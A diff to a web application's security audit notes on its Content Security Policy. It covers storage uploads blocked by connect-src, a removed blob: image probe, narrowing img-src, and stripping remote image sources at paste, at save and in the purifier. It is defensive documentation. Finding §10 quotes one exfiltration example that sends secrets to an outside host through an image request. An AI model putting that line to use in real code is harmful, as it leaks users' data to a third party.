@@ -187,7 +187,90 @@ and it would pin a developer's machine to a scheme it is not serving.
 
 Verified in a browser across the public site, an article, the CMS, the settings screen, the search
 palette and the builder canvas — the last being the sharpest test, since it portals React into an
-`about:blank` iframe. **No violations anywhere.**
+`about:blank` iframe. No violations on any screen that was visited.
+
+**That sentence used to end "No violations anywhere", and it was wrong.** Every screen was walked; no
+screen *did* anything. A media upload does not travel through PHP — the browser is handed a signed URL
+and PUTs the bytes at storage itself, cross-origin — so `connect-src 'self'` blocked every upload, in
+every environment, from the day this landed. The front end reported "Could not reach storage. Is it
+running?" about a service that was running perfectly well, which is why it was read as an outage for
+as long as it was. `e2e/cross/security.spec.js` walks 23 screens and never uploads, so it agreed.
+
+The fix adds the storage origin to `connect-src` on `/cms/*` only, derived from
+`filesystems.disks.s3.url` or `.endpoint` and stripped to a bare origin — a CSP source carrying
+`/bucket` matches by path prefix. `script-src` is untouched, so the part of the policy that stops
+script executing is exactly as it was; `connect-src` governs where already-running script may send
+data. Three `OwaspTest` cases now pin it, one of them by signing a real upload and checking the policy
+permits the host that signature points at — the two that only read the policy would both still pass if
+the signed host moved. `e2e/sidebar/09-media.spec.js` performs a real upload and asserts each step.
+
+**The upload test then immediately found a second one.** `uploadMedia.js` measured the picture before
+recording it, by decoding the file from a `URL.createObjectURL` blob — and `img-src` does not permit
+`blob:`, so the policy blocked that too. It failed invisibly: the probe has an `onerror` path that
+resolves to nulls, and `store()` measures the stored bytes itself and overwrites whatever the request
+carried, so a blocked measurement and a successful one produced the same row. The probe was removed
+rather than `blob:` added to the policy — widening a security header to accommodate a value that is
+discarded on arrival is the wrong trade, and `createObjectURL` appeared exactly once in the front end.
+`MediaTest` now covers recording an upload whose request does not say how big it is.
+
+The lesson for this document: a walkthrough covers the screens it visited, and saying "anywhere" of it
+is how a gap gets recorded as a guarantee. Two defects hid behind that sentence, and the same test
+found both within a minute of existing.
+
+### 10. `img-src` permitted any HTTPS host — medium — **FIXED**
+
+Found while checking §9, and not introduced by it. `img-src` was `'self' data: https:`, so script on any
+page could set `new Image().src = 'https://somewhere-else/?' + secrets` and the policy allowed it. An
+image needs no response to have already sent its query string, which made this a wider exfiltration
+channel than everything `connect-src` was carefully restricting — and tightening `connect-src` while
+leaving it open bought little.
+
+It is now `'self' data:`, plus the analytics hosts by name when an editor has entered a tracking id,
+since analytics still measures some things with a pixel and the blanket scheme used to cover that.
+
+The decision it needed was about content, not headers: article bodies may hold `<img>`, and
+`URI.AllowedSchemes` permits `http`/`https`, so a picture could be hotlinked. Narrowing the policy
+alone would have published such an image and drawn it for nobody — a failure with no error and no
+witness, which is the same shape as the two defects above. So it is handled in three places, and
+**which place matters more than the fact of it**:
+
+- **At the paste.** `RichTextEditor`'s `transformPastedHTML` drops remote image sources as they arrive
+  and says how many were left out, reading `isRemote()` from `resources/js/cms/remoteImages.js` the way
+  `passwordPolicy.js` mirrors its rule. Pasting is the only way one reaches an article body: the
+  toolbar's image button opens the media library and there is no box to type an address into.
+- **By removal, in the builder.** `ImageField` had such a box, and its placeholder read "or a web
+  address" — inviting precisely what the policy had stopped permitting, and producing a block that
+  saved, published and drew nothing. A warning under the field was tried and then thrown away in favour
+  of deleting the box: an image is chosen from the library, and nothing to type is a better guarantee
+  than a message explaining why what you typed will not work. The media library's own hint had to move
+  with it — it said "Paste this into an image field", an instruction that had outlived its target.
+- **At the save.** `Html::remoteImageSources()` finds them and `SaveBlogPostRequest` refuses, naming
+  the address. A backstop for a body arriving by some other path, not the path an editor takes.
+- **In the purifier.** `URI.DisableExternalResources`, if both are bypassed. Deliberately not
+  `DisableExternal`, which would take links with it — a link may leave this site, an image may not.
+
+Two traps, both with tests. `URI.Host` must be set from `app.url` or HTMLPurifier calls every absolute
+address external and strips an image the form request has just allowed — the body then comes back
+empty. And the refusal must not be the *first* line of defence: for one revision it was, which meant a
+writer pasting an article could not save their own words until they had hunted down addresses they
+never typed. `SaveBlogPostRequest` states the principle that forbids it — a paste "keeps their words
+and loses the markup… no error to decipher" — in the same file the refusal was added to.
+
+`og:image` is deliberately exempt: a social network's crawler fetches it server-side, and no browser
+content policy applies.
+
+So hotlinking is redirected rather than removed — paste whatever you like, pictures need uploading. If
+it is ever genuinely wanted, the honest way is an allowlist of hosts in all three places at once, never
+in the policy alone.
+
+**One gap left on purpose.** A section tree has no server-side equivalent of the body refusal, so a
+direct `PUT /cms/pages/{id}/sections` could still store a remote address — the builder simply offers no
+way to enter one, and that is all. It is left because the alternatives are both worse than the gap: the
+field schema that says which keys hold an image lives in `contentFields.js` and nowhere in PHP, so a
+backstop means either duplicating that schema in two languages or guessing an image by its file
+extension, and a guess inside validation is not something to rely on later. Worth revisiting only if the
+schema ever moves server-side. A remote address arriving that way is at least visible in the builder,
+which reports "That address did not load" when the picture fails — and a blocked image does fail.
 
 ## What holds up
 
